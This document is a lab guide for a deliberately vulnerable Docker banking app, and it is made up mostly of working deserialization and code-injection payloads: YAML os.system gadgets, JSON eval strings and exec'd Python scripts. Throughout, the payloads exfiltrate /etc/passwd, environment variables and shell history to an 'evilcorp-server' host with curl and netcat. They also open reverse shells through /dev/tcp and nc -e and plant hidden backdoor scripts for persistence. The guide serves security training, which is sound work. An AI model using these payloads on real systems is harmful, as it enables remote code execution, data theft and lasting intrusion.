# ============================================================================
# Deserialization Vulnerabilities
# ATTACK EXAMPLES & TESTING ENDPOINTS
# ============================================================================

## Environment Setup

Before starting, ensure you have:
- Banking-app container running
- Evilcorp-server container running
- Three terminal windows available

### Prepare for monitoring
1. On one terminal run `docker exec -it banking-app sh` This gives you terminal access to the banking-app server.
2. On another terminal run `docker exec -it evilcorp-server sh` This gives you terminal access to the evilcorp hacker server.

### The injection points
1. Navigate to the import functionality (`http://127.0.0.1:5000/import`)

The application accepts three dangerous import formats:
- **YAML Config**: Uses `yaml.load()` with unsafe Loader
- **JSON Template**: Uses `eval()` on preprocessing commands and formulas  
- **Config Script**: Uses `exec()` to execute uploaded Python code

---

## YAML Deserialization Attacks

### Target: yaml_config format
User uploads YAML files that get processed with `yaml.load(file_content, Loader=yaml.Loader)`

**Basic Command Execution**

Create file `malicious.yaml`:
```
version: "1.0"
description: "Transaction import configuration"
command_exec: !!python/object/apply:os.system
  - "echo YAML_ATTACK_SUCCESS > /tmp/yaml_test.txt"
```

**System Information Gathering**
Create file `malicious.yaml`:

```
version: "1.0"
system_info: !!python/object/apply:os.system
  - "whoami > /tmp/yaml_user.txt && id >> /tmp/yaml_user.txt"
```

**File System Exploration**
```
version: "1.0"
file_listing: !!python/object/apply:os.system
  - "find /tmp -type f -name '*.txt' > /tmp/yaml_files.txt"
```

### Advanced YAML Attacks

Upload the injection_files/import.yaml


## JSON Template Injection Attacks

### Target: json_template format
User uploads JSON with `preprocessing` commands and `formulas` that get passed to `eval()`

**Preprocessing Command Injection**

Create file `malicious.json`:
```
{
  "version": "2.1",
  "description": "Legitimate transaction template",
  "preprocessing": [
    {
      "name": "system_test",
      "command": "__import__('os').system('echo JSON_ATTACK > /tmp/json_success.txt')"
    }
  ],
  "transactions": []
}
```

**Formula-based Injection**
```
{
  "version": "2.1",
  "formulas": {
    "malicious_calc": "__import__('os').system('whoami > /tmp/json_user.txt')",
    "file_access": "open('/etc/hostname').read().strip()"
  },
  "transactions": []
}
```

**Multiple Attack Vectors**
```
{
  "version": "2.1",
  "preprocessing": [
    {
      "name": "recon",
      "command": "__import__('subprocess').call(['id'], stdout=open('/tmp/json_id.txt', 'w'))"
    }
  ],
  "formulas": {
    "data_theft": "__import__('os').system('cat /etc/hosts | nc evilcorp-server 5555')",
    "http_callback": "__import__('os').system('curl -X POST http://evilcorp-server:8888/json --data \"attack=successful\"')"
  },
  "transactions": []
}
```

### Advanced JSON Attacks

Upload the injection_files/import.json

---

## Configuration Script Attacks

### Target: config_script format
User uploads Python scripts that get executed with `exec(file_content)`

**Direct Python Script Execution**

Create file `malicious.py`:
```
# Legitimate looking configuration
print("Loading import configuration...")

import os
import subprocess

# Attack payloads
os.system('echo PYTHON_SCRIPT_ATTACK > /tmp/script_success.txt')
os.system('whoami > /tmp/script_user.txt')

# HTTP callback
os.system('curl -X POST http://evilcorp-server:8888/script --data "python_exec=successful"')

print("Configuration loaded!")
```

**Advanced Python Script**
```
import os
import subprocess
import socket

# System reconnaissance
os.system('id > /tmp/script_id.txt')
os.system('uname -a > /tmp/script_system.txt')

# Network callback
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('evilcorp-server', 5555))
    s.send(b'Python script callback successful\n')
    s.close()
except:
    pass

# File exfiltration
os.system('tar -czf /tmp/sensitive.tar.gz /etc/passwd /etc/hosts 2>/dev/null')
os.system('curl -X POST http://evilcorp-server:8888/files --data-binary @/tmp/sensitive.tar.gz')
```

---

## Testing Steps

### 1. Upload Malicious Files

1. **Navigate to Import Page:**
   ```
   http://localhost:5000/import
   ```

2. **For YAML attacks:**
   - Select "YAML Config" format
   - Upload your `.yaml` file
   - Click "Import Transactions"

3. **For JSON attacks:**
   - Select "JSON Template" format  
   - Upload your `.json` file
   - Click "Import Transactions"

4. **For Script attacks:**
   - Select "Config Script" format
   - Upload your `.py` file
   - Click "Import Transactions"

### 2. Verify Attack Success

**Check file creation (Terminal 1):**
```
docker exec -it banking-app sh
ls -la /tmp/
cat /tmp/yaml_test.txt
cat /tmp/json_success.txt
cat /tmp/script_success.txt
```

**Check HTTP callbacks (Terminal 2):**
```
docker exec -it evilcorp-server sh
cd /app/stolen_data
ls -la
cat http_*.txt
```

**Monitor netcat connections (Terminal 2):**
```
docker exec -it evilcorp-server sh
nc -lvp 5555
```

---

## Data Exfiltration Examples

### Via HTTP POST
**YAML Example:**
```
exfil_http: !!python/object/apply:os.system
  - "cat /etc/passwd | curl -X POST http://evilcorp-server:8888/data --data-binary @-"
```

**JSON Example:**
```
{
  "formulas": {
    "steal_data": "__import__('os').system('env | curl -X POST http://evilcorp-server:8888/env --data-binary @-')"
  }
}
```

### Via Netcat
**Python Script Example:**
```python
import os
os.system('find /home -name "*.txt" -exec cat {} \\; | nc evilcorp-server 5555')
```

### File Packaging and Exfiltration
**Combined Attack:**
```
package_and_send: !!python/object/apply:os.system
  - "tar -czf /tmp/steal.tar.gz /etc/passwd /etc/hosts /etc/hostname && curl -X POST http://evilcorp-server:8888/package --data-binary @/tmp/steal.tar.gz"
```

---

## Reverse Shell Examples

### Set up listener (Terminal 2):
```
docker exec -it evilcorp-server sh
nc -lvp 6666
```

### YAML Reverse Shell:
```
reverse_shell: !!python/object/apply:os.system
  - "bash -c 'exec 5<>/dev/tcp/evilcorp-server/6666;cat <&5|bash>&5'"
```

### JSON Reverse Shell:
```
{
  "formulas": {
    "shell": "__import__('os').system('nc -e /bin/sh evilcorp-server 6666')"
  }
}
```

### Test shell access:
- `whoami`
- `id`
- `ls /tmp`
- `cat /etc/passwd`

---

## Persistence Examples

### Create Backdoor Files
**Python Script:**
```python
import os
os.system('mkdir -p /tmp/.hidden')
os.system('echo "#!/bin/bash\ncurl http://evilcorp-server:8888/backdoor" > /tmp/.hidden/backdoor.sh')
os.system('chmod +x /tmp/.hidden/backdoor.sh')
```

### Environment Manipulation
**YAML:**
```
env_persist: !!python/object/apply:os.system
  - "echo 'export BACKDOOR=active' >> /tmp/.bashrc"
```

---

## Verification Commands

### Check application logs:
```
docker logs banking-app | grep DEBUG
```

### Verify file access:
```
docker exec -it banking-app find /tmp -name "*attack*" -o -name "*success*"
```

### Check network connections:
```
docker exec -it banking-app netstat -an | grep evilcorp-server
```

### Monitor evilcorp-server:
```
docker exec -it evilcorp-server tail -f /app/logs/access.log
```

---

## Impact Demonstration

### Complete System Compromise
1. **Information Gathering**: Extract system info, users, network config
2. **Credential Harvesting**: Search for passwords, keys, history files  
3. **Data Exfiltration**: Send sensitive files to attacker server
4. **Persistent Access**: Create backdoors and maintain access
5. **Lateral Movement**: Use compromised system to attack others

### Example Complete Attack Chain
```
# Complete compromise via YAML
version: "1.0"
phase1_recon: !!python/object/apply:os.system
  - "whoami && id && hostname > /tmp/recon.txt"
  
phase2_harvest: !!python/object/apply:os.system
  - "find /home -name '.bash_history' -exec cat {} \\; > /tmp/history.txt 2>/dev/null"
  
phase3_exfiltrate: !!python/object/apply:os.system
  - "tar -czf /tmp/complete_steal.tar.gz /tmp/recon.txt /tmp/history.txt /etc/passwd"
  
phase4_callback: !!python/object/apply:os.system
  - "curl -X POST http://evilcorp-server:8888/complete --data-binary @/tmp/complete_steal.tar.gz"
  
phase5_persist: !!python/object/apply:os.system
  - "echo '#!/bin/bash\ncurl http://evilcorp-server:8888/checkin' > /tmp/.maintenance && chmod +x /tmp/.maintenance"
```

---

## Safety Notes for Training

- All attacks are contained within Docker environment
- File system damage is limited to container
- Network access restricted to training environment
- No real systems or data at risk
- Containers can be reset between tests

This comprehensive testing demonstrates the severe risks of unsafe deserialization across multiple formats and attack vectors.